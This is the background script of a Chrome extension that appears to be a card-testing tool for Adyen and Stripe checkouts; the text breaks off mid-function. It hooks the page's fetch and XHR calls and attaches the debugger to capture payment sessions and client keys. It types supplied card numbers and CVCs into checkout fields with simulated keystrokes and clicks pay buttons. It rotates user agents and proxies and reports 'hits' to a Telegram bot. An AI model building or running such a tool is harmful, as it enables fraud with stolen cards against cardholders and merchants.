"use strict";

importScripts("proxy.js");
importScripts("telegram.js");

try { importScripts("local-defaults.js"); } catch (e) {}

(async function seedLocalDefaults() {
  try {
    if (typeof NONO_TG_DEFAULTS !== "undefined" && NONO_TG_DEFAULTS && NONO_TG_DEFAULTS.token) {
      const cfg = await getTg();
      if (!cfg.token || !cfg.chatId) {
        await setTg({
          enabled: NONO_TG_DEFAULTS.enabled === false ? false : true,
          token: NONO_TG_DEFAULTS.token,
          chatId: NONO_TG_DEFAULTS.chatId || cfg.chatId || "",
          allow: (cfg.allow && cfg.allow.length ? cfg.allow : DEFAULT_ALLOW.slice())
        });
        console.log("[adyen] telegram seeded from local-defaults.js");
      }
    }
  } catch (e) {}
})();

const ADYEN_PATTERNS = [
  '*://checkoutshopper-live.adyen.com/checkoutshopper/v1/*',
  '*://checkoutshopper-test.adyen.com/checkoutshopper/v1/*',
  '*://checkoutshopper-live.adyen.com/checkoutshopper/sessions/*',
  '*://*.adyen.com/*/sessions/*'
];

const STRIPE_PATTERNS = [
  '*://api.stripe.com/*',
  '*://checkout.stripe.com/*',
  '*://js.stripe.com/*',
  '*://pay.stripe.com/*',
  '*://*.stripe.com/*'
];

const CAPTURE_PATTERNS = ADYEN_PATTERNS.concat(STRIPE_PATTERNS);

const MAX_STORED = 50;
let captured = [];
let capturedResponses = [];
const pending = new Map();
const dbgPending = new Map();
let dbgTabId = -1;

const UA_STATE_KEY = "nonoUAState";
const DEFAULT_UAS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
];

const RESP_RE = /(checkoutshopper.*\/(payments|sessions|submit|result)(\?|$)|\/v1\/(payment_?intents|setup_?intents|payment_?methods|payment_?pages)\b|(confirm|pay|submit|paymentlinks)\/(confirm|pay)|api\.stripe\.com)/;

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.tabId === -1) return;

    pending.set(details.requestId, {
      tabId: details.tabId,
      url: details.url,
      method: details.method,
      timeStamp: details.timeStamp,
      body: null,
      requestHeaders: [],
      statusCode: null
    });

    if (details.requestBody) {
      const req = pending.get(details.requestId);
      try {
        if (details.requestBody.raw && details.requestBody.raw[0] && details.requestBody.raw[0].bytes) {
          const bytes = details.requestBody.raw[0].bytes;
          const decoded = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
          if (!decoded.includes('\uFFFD')) req.body = decoded;
        } else if (details.requestBody.formData) {
          const params = new URLSearchParams();
          for (const [key, values] of Object.entries(details.requestBody.formData)) {
            for (const v of values) params.append(key, v);
          }
          req.body = params.toString();
        }
      } catch (e) {}
    }
  },
  { urls: CAPTURE_PATTERNS },
  ['requestBody']
);

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const req = pending.get(details.requestId);
    if (!req) return;
    req.requestHeaders = details.requestHeaders || [];
  },
  { urls: CAPTURE_PATTERNS },
  ['requestHeaders', 'extraHeaders']
);

chrome.webRequest.onCompleted.addListener(
  (details) => {
    const req = pending.get(details.requestId);
    if (!req) return;

    req.statusCode = details.statusCode;
    pending.delete(details.requestId);

    const isInteresting = req.body &&
      (/adyen\.com/.test(req.url)
        ? (req.body.includes('sessionData') || req.body.includes('paymentMethod') || req.body.includes('card'))
        : (/stripe\.com/.test(req.url) && (
            req.body.includes('payment_method') ||
            req.body.includes('payment_intent') ||
            req.body.includes('client_secret') ||
            req.body.includes('card') ||
            req.body.includes('payment_link')
          )));

    if (!isInteresting) return;

    captured.unshift(req);
    if (captured.length > MAX_STORED) captured.pop();

    chrome.action.setBadgeText({ text: String(captured.length), tabId: req.tabId });
    chrome.action.setBadgeBackgroundColor({ color: '#4ec9b0' });

    chrome.runtime.sendMessage({
      type: 'ADYEN_REQUEST_CAPTURED',
      request: req,
      curl: generateCurl(req)
    }).catch(() => {});

    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon48.png',
      title: /stripe\.com/.test(req.url) ? 'Stripe Request Captured' : 'Adyen Request Captured',
      message: req.method + ' ' + truncateUrl(req.url)
    }, () => {});
  },
  { urls: CAPTURE_PATTERNS }
);

chrome.webRequest.onErrorOccurred.addListener(
  (details) => pending.delete(details.requestId),
  { urls: CAPTURE_PATTERNS }
);

chrome.tabs.onRemoved.addListener((tabId) => {
  if (tabId === dbgTabId) detachDebugger();
});

chrome.debugger.onEvent.addListener((src, method, params) => {
  if (!params) return;
  if (method === "Network.responseReceived") {
    const url = (params.response && params.response.url) || "";
    if (RESP_RE.test(url)) dbgPending.set(params.requestId, { url: url, base: false });
  } else if (method === "Network.loadingFinished") {
    const rec = dbgPending.get(params.requestId);
    if (!rec) return;
    dbgPending.delete(params.requestId);
    chrome.debugger.sendCommand(
      { tabId: src.tabId },
      "Network.getResponseBody",
      { requestId: params.requestId }
    ).then((res) => {
      let body = res.body || "";
      if (res.base64Encoded) {
        try { body = atob(body); } catch (e) { body = ""; }
      }
      emitCapturedResponse(src.tabId, rec.url, body);
    }).catch(() => {});
  } else if (method === "Network.responseReceivedExtraInfo" || method === "Network.loadingFailed") {
    dbgPending.delete(params.requestId);
  }
});

chrome.debugger.onDetach.addListener(() => {
  dbgTabId = -1;
  dbgPending.clear();
});

function attachDebugger(tabId) {
  return chrome.debugger.attach({ tabId: tabId }, "1.3").then(() => {
    dbgTabId = tabId;
    dbgPending.clear();
    return chrome.debugger.sendCommand({ tabId: tabId }, "Network.enable");
  }).then(async () => {
    const state = await getUAState();
    if (state.enabled) {
      const list = await getUAList();
      if (list[state.index]) await applyUAOverride(tabId, list[state.index]);
    }
  });
}

function detachDebugger() {
  if (dbgTabId === -1) return;
  try { chrome.debugger.detach({ tabId: dbgTabId }); } catch (e) {}
  dbgTabId = -1;
  dbgPending.clear();
}

function emitCapturedResponse(tabId, url, body) {
  const rec = { url: url.slice(0, 220), body: body, at: Date.now() };
  capturedResponses.unshift(rec);
  if (capturedResponses.length > 80) capturedResponses.pop();
  const isStripe = /stripe\.com/.test(String(url || ""));
  chrome.storage.local.set(isStripe ? { stripe_resp: rec } : { nono_resp: rec });
  chrome.runtime.sendMessage({
    type: isStripe ? "STRIPE_RESPONSE_CAPTURED" : "ADYEN_RESPONSE_CAPTURED",
    resp: rec
  }).catch(() => {});
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg && msg.action === 'FF_HOOK') {
    const tabId = sender && sender.tab && sender.tab.id;
    if (!tabId) {
      sendResponse({ error: 'no-tab' });
      return true;
    }
    const tryMain = () => chrome.scripting.executeScript({
      target: { tabId: tabId, frameIds: [0] },
      world: 'MAIN',
      func: injectResponseHook
    });
    tryMain().then(() => {
      sendResponse({ ok: true, world: 'MAIN' });
    }).catch(() => {
      chrome.scripting.executeScript({
        target: { tabId: tabId, allFrames: true },
        func: injectResponseHook
      }).then(() => {
        sendResponse({ ok: true, world: 'default' });
      }).catch((err) => {
        sendResponse({ error: String((err && err.message) || err) });
      });
    });
    return true;
  }
  if (msg && msg.action === 'DBG_ATTACH') {
    const tabId = sender && sender.tab && sender.tab.id;
    if (!tabId) {
      sendResponse({ error: 'no-tab' });
      return true;
    }
    attachDebugger(tabId).then(() => {
      sendResponse({ ok: true });
    }).catch((err) => {
      sendResponse({ error: String((err && err.message) || err) });
    });
    return true;
  }
  if (msg && msg.action === 'DBG_DETACH') {
    detachDebugger();
    sendResponse({ ok: true });
    return true;
  }
  function actionIsTG(msg) {
  return /^TG_/.test(msg.action || "");
}

async function handleTGMessage(msg, sendResponse, sender) {
  try {
    switch (msg.action) {
      case "TG_GET": {
        const cfg = await getTg();
        sendResponse({ cfg: { enabled: cfg.enabled, chatId: cfg.chatId, allow: cfg.allow, hasToken: !!cfg.token } });
        return;
      }
      case "TG_SET": {
        const cfg = await getTg();
        const next = {
          enabled: typeof msg.enabled === "boolean" ? msg.enabled : cfg.enabled,
          token: typeof msg.token === "string" && msg.token ? msg.token : cfg.token,
          chatId: typeof msg.chatId === "string" ? msg.chatId : cfg.chatId,
          allow: Array.isArray(msg.allow) ? msg.allow : (cfg.allow || DEFAULT_ALLOW.slice())
        };
        await setTg(next);
        sendResponse({ ok: true, hasToken: !!next.token });
        return;
      }
      case "TG_TEST": {
        const r = await tgSend("✅ Telegram connected — Adyen Link sandbox bridge is live.");
        sendResponse(r);
        return;
      }
      case "TG_HIT": {
        const tabUrl = sender && sender.tab ? sender.tab.url : "";
        const g = urlAllowed(tabUrl);
        if (!g.ok) { sendResponse({ ok: false, gated: true, reason: g.reason }); return; }
        const cfg = await getTg();
        if (!originPermitted(tabUrl, cfg)) {
          sendResponse({ ok: false, gated: true, reason: "origin not in sandbox allowlist" });
          return;
        }
        const r = await tgSend(msg.text || "");
        sendResponse(r);
        return;
      }
      default:
        sendResponse({ ok: false, error: "unknown tg action" });
    }
  } catch (e) {
    sendResponse({ ok: false, error: String((e && e.message) || e) });
  }
}

if (msg && actionIsTG(msg)) {
    handleTGMessage(msg, sendResponse, sender);
    return true;
  }
  if (msg && /^UA_/.test(msg.action || "")) {
    const tabId = sender && sender.tab && sender.tab.id;
    handleUAMessage(Object.assign({}, msg, { tabId: msg.tabId || tabId }), sendResponse);
    return true;
  }
  if (msg && /^PROXY_/.test(msg.action || "")) {
    handleProxyMessage(msg, sendResponse);
    return true;
  }
  if (msg && msg.type === 'GET_RESPONSES') {
    sendResponse({ responses: capturedResponses });
    return true;
  }
  if (msg && msg.type === 'GET_CAPTURED') {
    sendResponse({ captured });
    return true;
  }
  if (msg && msg.action === 'INBUILT_SESSION') {
    let found = { sessionId: "", clientKey: "", sessionData: "", payUrl: "", origin: "", rawUrl: "" };
    for (const r of capturedResponses) {
      const u = String(r.url || "");
      if (!/\/sessions\//.test(u)) continue;
      let j = null;
      try { j = JSON.parse(r.body); } catch (e) {}
      const sd = (j && (j.sessionData || (j.session && j.session.sessionData))) || "";
      if (!sd) continue;
      const sm = u.match(/\/sessions\/([A-Za-z0-9_-]+)/);
      if (!sm) continue;
      let ck = "";
      let origin = "";
      try {
        const U = new URL(u);
        ck = U.searchParams.get("clientKey") || "";
        origin = U.origin;
      } catch (e) {}
      ck = ck || (j && j.clientKey) || "";
      found.sessionId = sm[1];
      found.sessionData = sd;
      found.clientKey = ck;
      found.origin = origin;
      found.rawUrl = u;
      found.payUrl = origin
        ? origin + "/checkoutshopper/v1/sessions/" + found.sessionId + "/payments" +
          (ck ? "?clientKey=" + encodeURIComponent(ck) : "")
        : u;
      break;
    }
    if (!found.sessionId) {
      for (const c of captured) {
        const u = String(c.url || "");
        const sm = u.match(/\/sessions\/([A-Za-z0-9_-]+)/);
        if (!sm) continue;
        let j = null;
        try { j = JSON.parse(c.body || ""); } catch (e) {}
        let ck = (j && j.clientKey) || "";
        if (!ck) { try { ck = new URL(u).searchParams.get("clientKey") || ""; } catch (e) {} }
        found.sessionId = sm[1];
        found.clientKey = ck;
        try { found.origin = new URL(u).origin; } catch (e) {}
        found.rawUrl = u;
        found.payUrl = found.origin
          ? found.origin + "/checkoutshopper/v1/sessions/" + found.sessionId + "/payments" +
            (ck ? "?clientKey=" + encodeURIComponent(ck) : "")
          : u;
        break;
      }
    }
    sendResponse(Object.assign({ found: !!(found.sessionData && found.payUrl) }, found));
    return true;
  }
  if (msg && msg.action === 'GET_SESSION') {
    const id = String(msg.sessionId || "");
    const want = String(msg.url || "").split("?")[0];
    const pick = (u) => {
      try {
        u = String(u || "");
        if (u.charAt(0) === '"') u = u.slice(1);
        if (want && u.split("?")[0] !== want && !u.includes(want)) return false;
        if (id && !u.includes(id)) return false;
      } catch (e) {}
      return true;
    };
    let sessionData = "";
    let clientKey = "";
    let found = false;
    for (const c of captured) {
      if (!c.body || !pick(c.url)) continue;
      try {
        const j = JSON.parse(c.body);
        if (j && (j.sessionData || j.clientKey)) { sessionData = j.sessionData || sessionData; clientKey = j.clientKey || clientKey; found = true; break; }
      } catch (e) {}
    }
    if (!sessionData) {
      for (const r of capturedResponses) {
        if (!pick(r.url)) continue;
        try {
          const j = JSON.parse(r.body);
          const sd = (j && (j.sessionData || (j.session && j.session.sessionData))) || "";
          if (sd) { sessionData = sd; found = true; break; }
        } catch (e) {}
      }
    }
    sendResponse({ sessionData, clientKey, found });
    return true;
  }
  if (msg && msg.type === 'CLEAR_CAPTURED') {
    captured = [];
    chrome.action.setBadgeText({ text: '' });
    sendResponse({ ok: true });
    return true;
  }
  if (msg && msg.action === 'STRIPE_OPEN') {
    const raw = String(msg.url || '').trim();
    const url = /^https?:/i.test(raw) ? raw : 'https://' + raw;
    if (!/^https?:\/\/(buy|checkout|pay|m)\.stripe\.(com|network)\//i.test(url)) {
      sendResponse({ ok: false, error: 'not a stripe payment link' });
      return true;
    }
    chrome.tabs.create({ url: url, active: true }, (t) => {
      sendResponse({ ok: true, tabId: t && t.id });
    });
    return true;
  }
  if (msg && msg.action === 'FF_EXEC') {
    const tabId = sender && sender.tab && sender.tab.id;
    if (!tabId) {
      sendResponse({ error: 'no-tab', results: [] });
      return true;
    }
    chrome.scripting.executeScript({
      target: { tabId: tabId, allFrames: true },
      func: injectFill,
      args: [msg.card || {}]
    }).then((res) => {
      const results = (res || [])
        .map((r) => r.result)
        .filter(Boolean);
      const any = results.some((r) => r && r.any);
      const fields = results.reduce((acc, r) => {
        if (!r || !r.fields) return acc;
        ['number', 'month', 'year', 'cvc', 'postal'].forEach((f) => {
          if (r.fields[f]) acc[f] = true;
        });
        return acc;
      }, { number: false, month: false, year: false, cvc: false, postal: false });
      sendResponse({ results: results, any: any, fields: fields });
    }).catch((err) => {
      sendResponse({ error: String((err && err.message) || err), results: [] });
    });
    return true;
  }
  if (msg && msg.action === 'FF_PAY') {
    const tabId = sender && sender.tab && sender.tab.id;
    if (!tabId) {
      sendResponse({ error: 'no-tab', clicked: [], detected: false, submitting: false });
      return true;
    }
    chrome.scripting.executeScript({
      target: { tabId: tabId, allFrames: true },
      func: attemptPay
    }).then((res) => {
      const list = (res || []).map((r) => r.result).filter(Boolean);
      sendResponse({
        clicked: list.reduce((a, r) => a.concat((r && r.clicked) || []), []),
        detected: list.some((r) => r && r.detected),
        submitting: list.some((r) => r && r.submitting)
      });
    }).catch((err) => {
      sendResponse({ error: String((err && err.message) || err), clicked: [], detected: false, submitting: false });
    });
    return true;
  }
});

function attemptPay() {
  const out = { clicked: [], detected: false, submitting: false };
  function walkAll(root) {
    const out = [];
    const seen = new Set();
    (function walk(node) {
      if (!node) return;
      if (seen.has(node)) return;
      seen.add(node);
      if (node.nodeType === 1 || node.nodeType === 9 || node.shadowRoot) {
        let kids = [];
        if (node.nodeType === 9) kids = kids.concat(Array.from(node.children));
        else {
          if (node.shadowRoot) kids = kids.concat(Array.from(node.shadowRoot.children));
          kids = kids.concat(Array.from(node.children));
        }
        for (const k of kids) walk(k);
        if (node.nodeType === 1) out.push(node);
      }
    })(root);
    return out;
  }
  const els = walkAll(document);
  const candidates = [];
  for (const b of els) {
    if (!b.matches) continue;
    if (!b.matches("button, [role='button'], input[type='submit'], input[type='button'], a")) continue;
    const rect = b.getBoundingClientRect();
    if (!rect.width && !rect.height) continue;
    const label = ((b.innerText || b.value || b.getAttribute('aria-label') || '') + ' ' +
      (b.getAttribute('data-testid') || '') + ' ' + (b.id || '') + ' ' +
      (typeof b.className === 'string' ? b.className : '')).trim();
    const l = label.toLowerCase();
    const isSubmit = b.type === 'submit' ||
      b.matches("button[type='submit']") ||
      /pay|submit|confirm|place order|continue|complete purchase|pay \$/.test(l) ||
      /pay-button|submit|adyen-checkout__button/.test(l);
    if (isSubmit && !b.disabled) candidates.push(b);
  }
  for (const b of candidates) {
    try { b.scrollIntoView({ block: 'center' }); } catch (e) {}
    try { b.focus({ preventScroll: true }); } catch (e) {}
    const opts = { bubbles: true, cancelable: true, view: window, button: 0 };
    ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click'].forEach((t) => {
      try {
        const Ctor = t.indexOf('pointer') === 0 ? PointerEvent : MouseEvent;
        b.dispatchEvent(new Ctor(t, opts));
      } catch (e) {
        try { b.dispatchEvent(new MouseEvent(t, { bubbles: true, cancelable: true })); } catch (e2) {}
      }
    });
    try { b.click(); } catch (e) {}
    out.clicked.push(((b.innerText || b.value || 'btn').trim() || 'btn').slice(0, 24));
  }
  const html = document.documentElement ? document.documentElement.innerHTML : '';
  const body = document.body ? document.body.innerText : '';
  out.submitting = /processing|please wait|connecting|spinner|thanks|redirecting/.test(
    html.toLowerCase() + (body || '').toLowerCase().slice(0, 800)
  );
  out.detected = candidates.length > 0;
  return out;
}

function injectFill(card) {
  function setNativeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : el instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, 'value');
    if (!desc) return;
    desc.set.call(el, value);
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
    el.dispatchEvent(new Event('blur', { bubbles: true }));
  }

  const ZIP_BY_COUNTRY = {
    US: '10001', GB: 'SW1A 1AA', AE: '00000', CA: 'K1A 0B1', AU: '2000',
    DE: '10115', FR: '75001', SA: '11564', EG: '11511', IN: '110001',
    MY: '50000', SG: '018906', NL: '1011', IT: '00100', ES: '28001',
    SE: '111 57', CH: '8001', AT: '1010', BE: '1000', TR: '34418',
    KW: '00000', QA: '00000', BH: '00000', OM: '00000', JO: '11118',
    LB: '00000', IQ: '00000', IL: '00000', PK: '75500', BD: '1000',
    ID: '10110', TH: '10210', VN: '70000', PH: '1000', JP: '100-0001',
    KR: '04524', HK: '00000', TW: '100', NZ: '1010', IE: 'D01 F5R2',
    ZA: '8001', NG: '100001', KE: '00100', BR: '01310-100', MX: '01000',
    AR: 'C1000AAF', CL: '8320000', CO: '110111', PE: '15001', RU: '101000',
    UA: '01001', PL: '00-001', CZ: '110 00', SK: '811 01', HU: '1051',
    RO: '010011', BG: '1000', GR: '104 31', PT: '1100-320', DK: '1000',
    NO: '0150', FI: '00100', IS: '101', HR: '10000', RS: '11000',
    EE: '10111', LT: '01131', LV: 'LV-1050', CY: '1016', MT: 'VLT 1111',
    LU: 'L-1111', MC: '98000', AD: 'AD500', SM: '47890'
  };
  const countryUp = String(card && card.country || '').trim().toUpperCase().slice(0, 2);
  const fallbackZip = (card && (card.postal || card.zip)) || ZIP_BY_COUNTRY[countryUp] || ZIP_BY_COUNTRY.US;

  function typeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, 'value');
    if (!desc) return;
    desc.set.call(el, '');
    try {
      el.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'deleteContentBackward' }));
    } catch (e) {}
    const str = String(value);
    for (let i = 0; i < str.length; i++) {
      const ch = str[i];
      desc.set.call(el, el.value + ch);
      try {
        el.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new InputEvent('beforeinput', { bubbles: true, cancelable: true, inputType: 'insertText', data: ch }));
        el.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertText', data: ch }));
        el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, cancelable: true, key: ch }));
      } catch (e) {
        el.dispatchEvent(new Event('input', { bubbles: true }));
      }
    }
    try {
      el.dispatchEvent(new InputEvent('input', { bubbles: true }));
    } catch (e) {}
    el.dispatchEvent(new Event('change', { bubbles: true }));
    el.dispatchEvent(new Event('blur', { bubbles: true }));
    el.dispatchEvent(new FocusEvent('focusout', { bubbles: true }));
  }

  function classify(el) {
    const s = ((el.id || '') + ' ' + (el.name || '') + ' ' +
      (el.getAttribute('aria-label') || '') + ' ' +
      (el.getAttribute('placeholder') || '') + ' ' +
      (el.getAttribute('data-fieldtype') || '') + ' ' +
      (el.getAttribute('data-elements-stable-field-name') || '') + ' ' +
      (el.getAttribute('autocomplete') || '') + ' ' +
      (typeof el.className === 'string' ? el.className : '')).toLowerCase();
    if (/(^|[^a-z0-9])(card\s*[-_]?\s*number|cardnumber|cc[-_ ]?number|ccnum|pan|enter your card number|encrypted\w*(number|pan))/i.test(s)) return 'number';
    if (/(^|[^a-z0-9])(cc[-_]?exp[-_]?month|exp[-_]?month|expir(?:y|ation)[-_ ]*month|cardexpir(?:y|ation)?[-_]?month|expmonth|encrypted\w*month)/i.test(s)) return 'month';
    if (/(^|[^a-z0-9])(cc[-_]?exp[-_]?year|exp[-_]?year|expir(?:y|ation)[-_ ]*year|cardexpir(?:y|ation)?[-_]?year|expyear|encrypted\w*year)/i.test(s)) return 'year';
    if (/(^|[^a-z0-9])(cc[-_]?exp|exp[-_ ]?date|expdate|cardexpir(?:y|ation)?|expir(?:y|ation)([ -]?date)?|expiration\s*(date)?)/i.test(s)) return 'expiry';
    if (/(^|[^a-z0-9])(cvc|cvv|csc|security)[-_ ]*(code)?|cardcvc|cardcvcfront|security code|encryptedcvc/i.test(s)) return 'cvc';
    if (/(^|[^a-z0-9])(postal[-_\s]*(code)?|zip[-_\s]*code|zipcode|zip|postalcode|cc-zip)/i.test(s)) return 'postal';
    if (/(^|[^a-z0-9])(cardholder|holder[-_\s]*name|cc[-_ ]name|name[-_\s]*on[-_\s]*card|card[-_\s]*holder)/i.test(s)) return 'holder';
    if (/(^|[^a-z0-9])(mail|email|e-mail)/i.test(s)) return 'email';
    return null;
  }

  const fields = { number: false, month: false, year: false, cvc: false, expiry: false, postal: false, holder: false, email: false };
  let any = false;
  let cvcEl = null;

  let effectiveCountry = countryUp;
  let countrySel = null;
  try {
    const selects = Array.from(document.querySelectorAll('select'));
    for (const sel of selects) {
      const selSig = (sel.id + ' ' + sel.name + ' ' + (sel.getAttribute('aria-label') || '') + ' ' +
        (sel.getAttribute('data-elements-stable-field-name') || '') + ' ' +
        (sel.getAttribute('autocomplete') || '') + ' ' + String(sel.className || '')).toLowerCase();
      if (!/(^|[^a-z0-9])(country|billingcountry|addresscountry)/i.test(selSig)) continue;
      const opts = Array.from(sel.options || []);
      const hasAlpha2 = opts.some(function (o) { return /^[A-Z]{2}$/.test((o.value || o.text || '').trim()); });
      if (!hasAlpha2) continue;
      if (!countrySel) countrySel = sel;
      const cur = String(sel.value || '').trim().toUpperCase().slice(0, 2);
      if (!effectiveCountry && /^[A-Z]{2}$/.test(cur)) effectiveCountry = cur;
    }
    if (countrySel && effectiveCountry) {
      const want = effectiveCountry;
      const opt = Array.from(countrySel.options || []).find(function (o) {
        const v = String(o.value || o.text || '').trim().toUpperCase();
        return /^[A-Z]{2}$/.test(v) && v === want;
      });
      if (opt && String(countrySel.value || '').trim().toUpperCase() !== want) setNativeValue(countrySel, opt.value);
    }
  } catch (e) {}
  effectiveCountry = effectiveCountry || 'US';
  const zipValue = (card && (card.postal || card.zip)) || ZIP_BY_COUNTRY[effectiveCountry] || ZIP_BY_COUNTRY.US;

  const inputs = Array.from(document.querySelectorAll('input'));
  for (const inp of inputs) {
    if (inp.type === 'hidden') continue;
    const kind = classify(inp);
    if (!kind) continue;
    if (kind === 'number' && !fields.number) {
      typeValue(inp, card.number || '');
      fields.number = true; any = true;
    } else if (kind === 'expiry' && !fields.expiry && !fields.month && !fields.year) {
      typeValue(inp, String(card.month || card.expiryMonth || '12').padStart(2, '0') + '/' +
        String(card.year || card.expiryYear || '2029').slice(-2));
      fields.expiry = true; fields.month = true; fields.year = true; any = true;
    } else if (kind === 'month' && !fields.month) {
      typeValue(inp, String(card.month || card.expiryMonth || '12').padStart(2, '0'));
      fields.month = true; any = true;
    } else if (kind === 'year' && !fields.year) {
      typeValue(inp, String(card.year || card.expiryYear || '2029').slice(-2));
      fields.year = true; any = true;
    } else if (kind === 'cvc' && !fields.cvc) {
      typeValue(inp, card.cvc || '');
      fields.cvc = true; any = true;
      cvcEl = inp;
    } else if (kind === 'postal' && !fields.postal && zipValue) {
      typeValue(inp, zipValue);
      fields.postal = true; any = true;
    } else if (kind === 'holder' && !fields.holder) {
      setNativeValue(inp, card.holder || 'JOHN DOE');
      fields.holder = true;
    } else if (kind === 'email' && !fields.email) {
      const maybeEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || '');
      if (maybeEmail) setNativeValue(inp, maybeEmail);
      fields.email = true;
    }
  }

  if (!fields.number) {
    const n = document.querySelector(
      'input[autocomplete="cc-number"], input[name*="cardNumber" i], input[id*="cardNumber" i], input[name="cardnumber"], input[data-elements-stable-field-name="cardNumber"]'
    );
    if (n) { typeValue(n, card.number || ''); fields.number = true; any = true; }
  }
  if (!fields.month && !fields.year && !fields.expiry) {
    const e = document.querySelector(
      'input[autocomplete="cc-exp"], input[name*="expiry" i], input[id*="expiry" i], input[name="exp-date"], input[data-elements-stable-field-name="cardExpiry"]'
    );
    if (e) {
      typeValue(e, String(card.month || card.expiryMonth || '12').padStart(2, '0') + '/' +
        String(card.year || card.expiryYear || '2029').slice(-2));
      fields.month = true; fields.year = true; fields.expiry = true; any = true;
    }
  }
  if (!fields.cvc) {
    const c = document.querySelector(
      'input[autocomplete="cc-csc"], input[autocomplete="cc-cvc"], input[name*="securityCode"], input[name*="cvc"], input[name="cvc"], input[data-elements-stable-field-name="cardCvc"]'
    );
    if (c) { typeValue(c, card.cvc || ''); fields.cvc = true; any = true; cvcEl = c; }
  }
  if (!fields.postal && zipValue) {
    const p = document.querySelector(
      'input[autocomplete="postal-code"], input[name="postal"], input[name="zip"], input[id*="postal" i], input[data-elements-stable-field-name="postalCode"]'
    );
    if (p) { typeValue(p, zipValue); fields.postal = true; any = true; }
  }

  if (cvcEl) {
    const enter = { bubbles: true, cancelable: true, key: 'Enter', code: 'Enter', keyCode: 13, which: 13 };
    try {
      cvcEl.dispatchEvent(new KeyboardEvent('keydown', enter));
      cvcEl.dispatchEvent(new KeyboardEvent('keypress', enter));
      cvcEl.dispatchEvent(new KeyboardEvent('keyup', enter));
    } catch (e) {}
  }

  const holderEl = document.querySelector(
    'input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]'
  );
  if (holderEl) setNativeValue(holderEl, card.holder || 'JOHN DOE');

  const emailEl = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
  const candidateEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || '');
  if (emailEl && candidateEmail) {
    setNativeValue(emailEl, candidateEmail);
  }

  return { fields: fields, any: any, url: location.href.slice(0, 120) };
}

function injectResponseHook() {
  if (window.__nonohooked) return;
  window.__nonohooked = true;

  const isInteresting = (url) =>
    /checkoutshopper.*\/(payments|sessions|submit|result)(\?|$)/.test(url) ||
    /api\.stripe\.com\/(v1\/)?(payment_?intents|setup_?intents|payment_?methods|payment_?pages|paymentlinks|checkout\b|sessions)|(confirm|pay|submit)/.test(url) ||
    /(checkout|pay)\.stripe\.com.*(confirm|pay|submit)/.test(url);

  const push = (data) => {
    try {
      document.dispatchEvent(new CustomEvent('nonnho-capture', { detail: data }));
    } catch (e) {}
  };

  const OXHR = window.XMLHttpRequest;
  if (OXHR) {
    try {
      window.XMLHttpRequest = function () {
        const x = new OXHR();
        const oOpen = x.open;
        x.open = function (m, url, ...rest) {
          x.__nurl = String(url || '');
          try { return oOpen.apply(this, [m, url, ...rest]); }
          catch (e) { return oOpen.apply(this, arguments); }
        };
        x.addEventListener('load', function () {
          try {
            const u = String(x.__nurl || '');
            if (isInteresting(u)) {
              push({ kind: 'xhr', url: u, status: x.status, body: x.responseText || '' });
            }
          } catch (e) {}
        });
        return x;
      };
      window.XMLHttpRequest.prototype = OXHR.prototype;
    } catch (e) {}
  }

  const OF = window.fetch;
  if (OF) {
    try {
      window.fetch = function (input, init) {
        const url = (typeof input === 'string')
          ? input
          : (input && input.url ? input.url : '');
        const p = OF.apply(this, arguments);
        if (isInteresting(url)) {
          p.then((res) => {
            try {
              const clone = res.clone();
              clone.text().then((t) => {
                push({ kind: 'fetch', url: url, status: res.status, body: t || '' });
              }).catch(() => {});
            } catch (e) {}
          }).catch(() => {});
        }
        return p;
      };
    } catch (e) {}
  }
}

function stripHdr(h) {
  const name = (h.name || '').toLowerCase();
  return ['host', 'connection', 'content-length', 'accept-encoding'].includes(name);
}

function generateCurl(req) {
  const lines = ["curl '" + (req.url || '') + "'"];

  if (req.requestHeaders && Array.isArray(req.requestHeaders)) {
